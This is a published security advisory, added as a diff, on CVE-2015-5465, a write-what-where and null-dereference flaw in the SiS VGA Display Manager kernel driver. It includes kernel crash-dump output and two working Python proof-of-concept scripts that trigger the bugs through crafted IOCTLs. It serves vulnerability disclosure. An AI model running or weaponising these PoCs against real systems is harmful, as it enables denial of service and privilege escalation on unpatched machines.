@@ -1,0 +1,433 @@
+KL-001-2015-003 : SiS Windows VGA Display Manager Multiple Privilege
+Escalation
+
+Title: SiS Windows VGA Display Manager Multiple Privilege Escalation
+Advisory ID: KL-001-2015-003
+Publication Date: 2015.09.01
+Publication URL:
+https://www.korelogic.com/Resources/Advisories/KL-001-2015-003.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Silicon Integrated Systems Corporation
+     Affected Product: Windows VGA Display Manager
+     Affected Version: 6.14.10.3930
+     Platform: Microsoft Windows 7 (x86), Microsoft Windows XP SP3
+     CWE Classification: CWE-123: Write-what-where condition
+     Impact: Arbitrary Code Execution
+     Attack vector: IOCTL
+     CVE-ID: CVE-2015-5465
+
+2. Vulnerability Description
+
+     Vulnerabilities within the srvkp module allows an attacker
+     to inject memory they control into an arbitrary location
+     they define or cause memory corruption. IOCTL request codes
+     0x96002400 and 0x96002404 have been demonstrated to trigger
+     these vulnerabilities. These vulnerabilities can be used
+     to obtain control of code flow in a privileged process and
+     ultimately be used to escalate the privilege of an attacker.
+
+3. Technical Description
+
+     Example against Windows XP:
+
+     Windows XP Kernel Version 2600 (Service Pack 3) UP Free x86
+compatible
+     Product: WinNt, suite: TerminalServer SingleUserTS
+     Built by: 2600.xpsp_sp3_qfe.101209-1646
+     Machine Name:
+     Kernel base = 0x804d7000 PsLoadedModuleList = 0x805540c0
+
+
+************************************************************************
+*******
+     *
+             *
+     *                        Bugcheck Analysis
+             *
+     *
+             *
+
+************************************************************************
+*******
+
+     Use !analyze -v to get detailed debugging information.
+     BugCheck 50, {ffff0000, 1, 804f3b76, 0}
+     Probably caused by : srvkp.sys ( srvkp+3329 )
+     Followup: MachineOwner
+     ---------
+
+     kd> kn
+     Call stack:  # ChildEBP RetAddr
+     00 f6a529a0 8051cc7f nt!KeBugCheckEx+0x1b
+     01 f6a52a00 805405d4 nt!MmAccessFault+0x8e7
+     02 f6a52a00 804f3b76 nt!KiTrap0E+0xcc
+     03 f6a52ad0 804fdaf1 nt!IopCompleteRequest+0x92
+     04 f6a52b20 806d3c35 nt!KiDeliverApc+0xb3
+     05 f6a52b20 806d3861 hal!HalpApcInterrupt+0xc5
+     06 f6a52ba8 804fab03 hal!KeReleaseInStackQueuedSpinLock+0x11
+     07 f6a52bc8 804f07e4 nt!KeInsertQueueApc+0x4b
+     08 f6a52bfc f7910329 nt!IopfCompleteRequest+0x1d8
+     09 f6a52c34 804ee129 srvkp+0x3329
+     0a f6a52c44 80574e56 nt!IopfCallDriver+0x31
+     0b f6a52c58 80575d11 nt!IopSynchronousServiceTail+0x70
+     0c f6a52d00 8056e57c nt!IopXxxControlFile+0x5e7
+     0d f6a52d34 8053d6d8 nt!NtDeviceIoControlFile+0x2a
+     0e f6a52d34 7c90e514 nt!KiFastCallEntry+0xf8
+     0f 0021f3e4 7c90d28a ntdll!KiFastSystemCallRet
+     10 0021f3e8 1d1add7a ntdll!ZwDeviceIoControlFile+0xc
+     11 0021f41c 1d1aca96 _ctypes!DllCanUnloadNow+0x5b4a
+     12 0021f44c 1d1a8db8 _ctypes!DllCanUnloadNow+0x4866
+     13 0021f4fc 1d1a959e _ctypes!DllCanUnloadNow+0xb88
+     14 0021f668 1d1a54d8 _ctypes!DllCanUnloadNow+0x136e
+     15 0021f6c0 1e07bd9c _ctypes+0x54d8
+     16 00000000 00000000 python27!PyObject_Call+0x4c
+
+     Example against Windows 7:
+
+     Microsoft (R) Windows Debugger Version 6.2.9200.20512 X86
+     Copyright (c) Microsoft Corporation. All rights reserved.
+
+
+     Loading Dump File [C:\Windows\MEMORY.DMP]
+     Kernel Summary Dump File: Only kernel address space is available
+
+     Symbol search path is: *** Invalid ***
+
+************************************************************************
+****
+     * Symbol loading may be unreliable without a symbol search path.
+          *
+     * Use .symfix to have the debugger choose a symbol path.
+          *
+     * After setting your symbol path, use .reload to refresh symbol
+locations. *
+
+************************************************************************
+****
+     Executable search path is:
+     *******************************************************************
+**
+     * Symbols can not be loaded because symbol path is not initialized.
+ *
+     *
+ *
+     * The Symbol Path can be set by:
+ *
+     *   using the _NT_SYMBOL_PATH environment variable.
+ *
+     *   using the -y <symbol_path> argument when starting the debugger.
+ *
+     *   using .sympath and .sympath+
+ *
+     *******************************************************************
+**
+     *** ERROR: Symbol file could not be found.  Defaulted to export
+symbols for ntkrpamp.exe -
+     Windows 7 Kernel Version 7601 (Service Pack 1) UP Free x86 compatib
+le
+     Product: WinNt, suite: TerminalServer SingleUserTS
+     Built by: 7601.17514.x86fre.win7sp1_rtm.101119-1850
+     Machine Name:
+     Kernel base = 0x82a12000 PsLoadedModuleList = 0x82b5c850
+     Debug session time: Mon Aug 17 14:36:36.286 2015 (UTC - 7:00)
+     System Uptime: 0 days 11:46:55.313
+     *******************************************************************
+**
+     * Symbols can not be loaded because symbol path is not initialized.
+ *
+     *
+ *
+     * The Symbol Path can be set by:
+ *
+     *   using the _NT_SYMBOL_PATH environment variable.
+ *
+     *   using the -y <symbol_path> argument when starting the debugger.
+ *
+     *   using .sympath and .sympath+
+ *
+     *******************************************************************
+**
+     *** ERROR: Symbol file could not be found.  Defaulted to export
+symbols for ntkrpamp.exe -
+     Loading Kernel Symbols
+     ...............................................................
+     ................................................................
+     .....................................
+     Loading User Symbols
+     PEB is paged out (Peb.Ldr = 7ffd400c).  Type ".hh dbgerr001" for
+details
+     Loading unloaded module list
+     ..............................
+
+************************************************************************
+*******
+     *
+             *
+     *                        Bugcheck Analysis
+             *
+     *
+             *
+
+************************************************************************
+*******
+
+     Use !analyze -v to get detailed debugging information.
+
+     BugCheck 8E, {c0000005, ac08f2fa, 93df4a50, 0}
+
+     ***** Kernel symbols are WRONG. Please fix symbols to do analysis.
+     ...
+     ...
+     ...
+
+     Followup: MachineOwner
+     ---------
+
+     kd> .symfix;.reload
+     Loading Kernel Symbols
+     ...............................................................
+     ................................................................
+     .....................................
+     Loading User Symbols
+     PEB is paged out (Peb.Ldr = 7ffd400c).  Type ".hh dbgerr001" for
+details
+     Loading unloaded module list
+     ..............................
+     kd> !analyze -v
+
+************************************************************************
+*******
+     *
+             *
+     *                        Bugcheck Analysis
+             *
+     *
+             *
+
+************************************************************************
+*******
+
+     KERNEL_MODE_EXCEPTION_NOT_HANDLED (8e)
+     This is a very common bugcheck.  Usually the exception address
+pinpoints
+     the driver/function that caused the problem.  Always note this
+address
+     as well as the link date of the driver/image that contains this
+address.
+     Some common problems are exception code 0x80000003.  This means a
+hard
+     coded breakpoint or assertion was hit, but this system was booted
+     /NODEBUG.  This is not supposed to happen as developers should
+never have
+     hardcoded breakpoints in retail code, but ...
+     If this happens, make sure a debugger gets connected, and the
+     system is booted /DEBUG.  This will let us see why this breakpoint
+is
+     happening.
+     Arguments:
+     Arg1: c0000005, The exception code that was not handled
+     Arg2: ac08f2fa, The address that the exception occurred at
+     Arg3: 93df4a50, Trap Frame
+     Arg4: 00000000
+
+     Debugging Details:
+     ------------------
+
+     *** ERROR: Module load completed but symbols could not be loaded
+for srvkp.sys
+
+     EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at
+0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+     FAULTING_IP:
+     srvkp+32fa
+     ac08f2fa 8b4804          mov     ecx,dword ptr [eax+4]
+
+     TRAP_FRAME:  93df4a50 -- (.trap 0xffffffff93df4a50)
+     ErrCode = 00000000
+     eax=00000000 ebx=00000000 ecx=00000000 edx=93df4ae4 esi=85644140
+edi=d68fc588
+     eip=ac08f2fa esp=93df4ac4 ebp=93df4afc iopl=0         nv up ei pl
+zr na pe nc
+     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000
+efl=00010246
+     srvkp+0x32fa:
+     ac08f2fa 8b4804          mov     ecx,dword ptr [eax+4]
+ds:0023:00000004=????????
+     Resetting default scope
+
+     DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT
+
+     BUGCHECK_STR:  0x8E
+
+     PROCESS_NAME:  python.exe
+
+     CURRENT_IRQL:  0
+
+     LAST_CONTROL_TRANSFER:  from 82ac708c to 82af0f20
+
+     STACK_TEXT:
+     93df45c4 82ac708c 0000008e c0000005 ac08f2fa nt!KeBugCheckEx+0x1e
+     93df49e0 82a50dd6 93df49fc 00000000 93df4a50
+nt!KiDispatchException+0x1ac
+     93df4a48 82a50d8a 93df4afc ac08f2fa badb0d00
+nt!CommonDispatchException+0x4a
+     93df4afc 82a49593 85644140 869fb048 869fb048 nt!KiExceptionExit+0x1
+92
+     93df4b14 82c3d99f d68fc588 869fb048 869fb0b8 nt!IofCallDriver+0x63
+     93df4b34 82c40b71 85644140 d68fc588 00000000
+nt!IopSynchronousServiceTail+0x1f8
+     93df4bd0 82c873f4 85644140 869fb048 00000000
+nt!IopXxxControlFile+0x6aa
+     93df4c04 82a501ea 00000088 00000000 00000000
+nt!NtDeviceIoControlFile+0x2a
+     93df4c04 77d270b4 00000088 00000000 00000000 nt!KiFastCallEntry+0x1
+2a
+     WARNING: Frame IP not in any known module. Following frames may
+be wrong.
+     0021f3dc 00000000 00000000 00000000 00000000 0x77d270b4
+
+     STACK_COMMAND:  kb
+
+     FOLLOWUP_IP:
+     srvkp+32fa
+     ac08f2fa 8b4804          mov     ecx,dword ptr [eax+4]
+
+     SYMBOL_STACK_INDEX:  0
+
+     SYMBOL_NAME:  srvkp+32fa
+
+     FOLLOWUP_NAME:  MachineOwner
+
+     MODULE_NAME: srvkp
+
+     IMAGE_NAME:  srvkp.sys
+
+     DEBUG_FLR_IMAGE_TIMESTAMP:  4cc65532
+
+     FAILURE_BUCKET_ID:  0x8E_srvkp+32fa
+
+     BUCKET_ID:  0x8E_srvkp+32fa
+
+     Followup: MachineOwner
+     ---------
+
+4. Mitigation and Remediation Recommendation
+
+     No response from vendor; no remediation available.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin of KoreLogic
+     Security, Inc.
+
+6. Disclosure Timeline
+
+     2015.05.14 - Initial contact; requested security contact.
+     2015.05.18 - Second contact attempt.
+     2015.05.25 - Third contact attempt.
+     2015.07.02 - KoreLogic requests CVE from Mitre.
+     2015.07.10 - Mitre issues CVE-2015-5465.
+     2015.07.28 - 45 business days have elapsed since KoreLogic last
+                  attempted to contact SiS without a response.
+     2015.09.01 - Public disclosure.
+
+7. Proof of Concept
+
+     # Arbitrary Write (Windows XP)
+     from sys import exit
+     from ctypes import *
+     NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
+     WriteProcessMemory = windll.kernel32.WriteProcessMemory
+     DeviceIoControl = windll.ntdll.NtDeviceIoControlFile
+     CreateFileA = windll.kernel32.CreateFileA
+     CloseHandle = windll.kernel32.CloseHandle
+     FILE_SHARE_READ,FILE_SHARE_WRITE = 0,1
+     OPEN_EXISTING = 3
+     NULL = None
+
+     device = "siskp"
+     code = 0x96002404
+     inlen = 0xe6b6
+     outlen = 0x0
+     inbuf = 0x1
+     outbuf = 0xffff0000
+     inBufMem = "\x90"*inlen
+
+     def main():
+     	try:
+      		handle = CreateFileA("\\\\.\\%s" %
+(device),FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
+      		if (handle == -1):
+      			print "[-] error creating handle"
+      			exit(1)
+      	except Exception as e:
+      		print "[-] error creating handle"
+      		exit(1)
+
+NtAllocateVirtualMemory(-1,byref(c_int(0x1)),0x0,byref(c_int(0xffff)),0x
+1000|0x2000,0x40)
+      	WriteProcessMemory(-1,0x1,inBufMem,inlen,byref(c_int(0)))
+
+DeviceIoControl(handle,NULL,NULL,NULL,byref(c_ulong(8)),code,0x1,inlen,o
+utbuf,outlen)
+      	CloseHandle(handle)
+      	return False
+
+     if __name__=="__main__":
+     	main()
+
+     and
+
+     # Null Pointer Dereference (Windows XP/7)
+     from sys import exit
+     from ctypes import *
+     DeviceIoControl = windll.ntdll.NtDeviceIoControlFile
+     CreateFileA = windll.kernel32.CreateFileA
+     CloseHandle = windll.kernel32.CloseHandle
+     FILE_SHARE_READ,FILE_SHARE_WRITE = 0,1
+     OPEN_EXISTING = 3
+     NULL = None
+
+     device = "siskp"
+     code = 0x96002400
+
+     def main():
+     	try:
+      		handle = CreateFileA("\\\\.\\%s" %
+(device),FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
+      		if (handle == -1):
+      			print "[-] error creating handle"
+      			exit(1)
+      	except Exception as e:
+      		print "[-] error creating handle"
+      		exit(1)
+
+DeviceIoControl(handle,NULL,NULL,NULL,byref(c_ulong(8)),code,0x1,0x0,0x0
+,0x0)
+      	CloseHandle(handle)
+      	return False
+
+     if __name__=="__main__":
+     	main()
+
+The contents of this advisory are copyright(c) 2015
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Poli
+cy.v1.0.txt
